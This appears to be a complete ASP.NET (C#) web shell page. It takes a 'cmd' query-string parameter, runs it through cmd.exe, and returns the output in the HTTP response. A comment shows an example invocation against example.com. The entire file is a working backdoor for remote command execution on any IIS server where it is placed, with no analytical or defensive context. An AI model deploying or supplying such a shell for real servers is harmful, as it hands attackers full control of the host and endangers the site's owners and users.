// This will only work if the server is configured to allow script execution.
// Execution: http://example.com/webshell_backtricks.php?cmd=id

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<%
string cmd = Request.QueryString["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();

Response.Write(p.StandardOutput.ReadToEnd());
p.WaitForExit();
%>